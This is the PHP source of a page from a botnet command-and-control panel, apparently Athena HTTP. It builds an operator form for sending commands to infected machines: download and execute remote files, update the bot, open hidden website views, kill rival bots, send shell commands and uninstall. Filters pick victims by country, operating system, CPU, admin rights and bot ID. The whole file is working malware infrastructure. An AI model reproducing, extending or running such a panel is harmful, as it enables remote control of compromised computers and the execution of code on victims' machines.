<?php

	if(!defined('AthenaHTTP')) header('Location: ..');

	$PAGE_INCLUDE = '';
	
	require_once './include/inc_misc.php';

	if($STATUS_NOTE)
	{
		$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
		$PAGE_INCLUDE .= '				<span class="title"> </span>' . "\n";
		$PAGE_INCLUDE .= '				<p>' . "\n";
		$PAGE_INCLUDE .= '					' . $STATUS_MESSAGE . "\n";
		$PAGE_INCLUDE .= '				</p>' . "\n";
		$PAGE_INCLUDE .= '			</div>' . "\n";
	}	

	$PAGE_INCLUDE .= '			<div class="content small">' . "\n";
	$PAGE_INCLUDE .= '				<form action="./index.php?p=misc" method="POST">' . "\n";
	$PAGE_INCLUDE .= '					<span class="title">Create Commands</span>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Command:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<select name="misc_task" onChange="changeLayoutMisc(this.value);">' . "\n";
	
	if($USERINFO['priv1'] || $USERINFO['priv4'] || $USERINFO['admin'])
	{
		$PAGE_INCLUDE .= '								<optgroup label="Download">' . "\n";
		
		if($USERINFO['priv1'] || $USERINFO['admin'])
		{
			$PAGE_INCLUDE .= '									<option value="download">Download & Execute</option>' . "\n";
			$PAGE_INCLUDE .= '									<option value="download.arguments">Download & Execute (with arguments)</option>' . "\n";
		}
		
		if($USERINFO['priv4'] || $USERINFO['admin'])		
			$PAGE_INCLUDE .= '									<option value="download.update">Update</option>' . "\n";
		
		$PAGE_INCLUDE .= '								</optgroup>' . "\n";
	}
	
	if($USERINFO['priv2'] || $USERINFO['admin'])
	{	
		$PAGE_INCLUDE .= '								<optgroup label="Website View">' . "\n";
		$PAGE_INCLUDE .= '									<option value="view">View</option>' . "\n";
		$PAGE_INCLUDE .= '									<option value="view.hidden">View Hidden</option>' . "\n";
		$PAGE_INCLUDE .= '									<option value="smartview.add">Add to SmartView</option>' . "\n";
		$PAGE_INCLUDE .= '									<option value="smartview.del">Remove from SmartView</option>' . "\n";
		$PAGE_INCLUDE .= '									<option value="smartview.clear">Clear SmartView</option>' . "\n";
		$PAGE_INCLUDE .= '								</optgroup>' . "\n";
	}
	
	if($USERINFO['priv3'] || $USERINFO['admin'])
	{
		$PAGE_INCLUDE .= '								<optgroup label="Botkiller">' . "\n";
		$PAGE_INCLUDE .= '									<option value="botkill.start">Start</option>' . "\n";
		$PAGE_INCLUDE .= '									<option value="botkill.stop">Stop</option>' . "\n";
		$PAGE_INCLUDE .= '									<option value="botkill.once">One Cycle</option>' . "\n";
		$PAGE_INCLUDE .= '								</optgroup>' . "\n";
	}
	
	if($USERINFO['priv1'] || $USERINFO['admin'])
	{
		$PAGE_INCLUDE .= '								<optgroup label="Shell Command">' . "\n";
		$PAGE_INCLUDE .= '									<option value="shell">Send</option>' . "\n";
		$PAGE_INCLUDE .= '								</optgroup>' . "\n";
	}
	
	if($USERINFO['priv4'] || $USERINFO['admin'])
	{
		$PAGE_INCLUDE .= '								<optgroup label="Miscellaneous">' . "\n";
		$PAGE_INCLUDE .= '									<option value="uninstall">Uninstall</option>' . "\n";
		$PAGE_INCLUDE .= '								</optgroup>' . "\n";
	}
	
	$PAGE_INCLUDE .= '							</select>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p id="misc_url">' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">URL:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="misc_url" type="text" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p id="misc_command">' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Shell Command:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="misc_command" type="text" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p id="misc_args">' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Arguments:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="misc_args" type="text" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p id="misc_open">' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Opening Interval:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="misc_open" type="text" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p id="misc_close">' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Closing Interval:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="misc_close" type="text" /></span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<span class="foot">' . "\n";
	$PAGE_INCLUDE .= '						<input type="submit" value="Launch Command" />' . "\n";
	$PAGE_INCLUDE .= '					</span>' . "\n";
	$PAGE_INCLUDE .= '				</div>' . "\n";
	$PAGE_INCLUDE .= '				<div class="content small">' . "\n";
	$PAGE_INCLUDE .= '					<span class="title">Filter</span>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left"></span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<span class="small">To apply no filter for a category leave the selection blank.</span>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Amount of Bots:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="filter_amount" type="text" />' . "\n";
	$PAGE_INCLUDE .= '							<br />' . "\n";
	$PAGE_INCLUDE .= '							<span class="small">Leave this field empty for no limitation.</span>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Country:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<select name="filter_country[]" multiple>' . "\n";
	$PAGE_INCLUDE .= $PAGE_INCLUDE_FILTER_COUNTRY;
	$PAGE_INCLUDE .= '							</select>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Operating System:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<select name="filter_os[]" multiple>' . "\n";
	$PAGE_INCLUDE .= $PAGE_INCLUDE_FILTER_OS;
	$PAGE_INCLUDE .= '							</select>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">CPU Architecture:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<select name="filter_cpu[]" multiple>' . "\n";
	$PAGE_INCLUDE .= '								<option value="1">32 Bit</option>' . "\n";
	$PAGE_INCLUDE .= '								<option value="0">64 Bit</option>' . "\n";
	$PAGE_INCLUDE .= '							</select>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Computer Type:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<select name="filter_type[]" multiple>' . "\n";
	$PAGE_INCLUDE .= '								<option value="1">Desktop</option>' . "\n";
	$PAGE_INCLUDE .= '								<option value="0">Laptop</option>' . "\n";
	$PAGE_INCLUDE .= '							</select>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Bot Version:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<select name="filter_botversion[]" multiple>' . "\n";
	$PAGE_INCLUDE .= $PAGE_INCLUDE_FILTER_BOTVERSION;
	$PAGE_INCLUDE .= '							</select>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">.NET Version:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<select name="filter_net[]" multiple>' . "\n";
	$PAGE_INCLUDE .= $PAGE_INCLUDE_FILTER_NET;
	$PAGE_INCLUDE .= '							</select>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Admin:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right">' . "\n";
	$PAGE_INCLUDE .= '							<select name="filter_admin[]" multiple>' . "\n";
	$PAGE_INCLUDE .= '								<option value="1">Yes</option>' . "\n";
	$PAGE_INCLUDE .= '								<option value="0">No</option>' . "\n";
	$PAGE_INCLUDE .= '							</select>' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '					<p>' . "\n";
	$PAGE_INCLUDE .= '						<span class="left">Specific Bot Id:</span>' . "\n";
	$PAGE_INCLUDE .= '						<span class="right"><input name="filter_botid" type="text" />' . "\n";
	$PAGE_INCLUDE .= '						</span>' . "\n";
	$PAGE_INCLUDE .= '					</p>' . "\n";
	$PAGE_INCLUDE .= '				</form>' . "\n";
	$PAGE_INCLUDE .= '			</div>' . "\n";
	
?>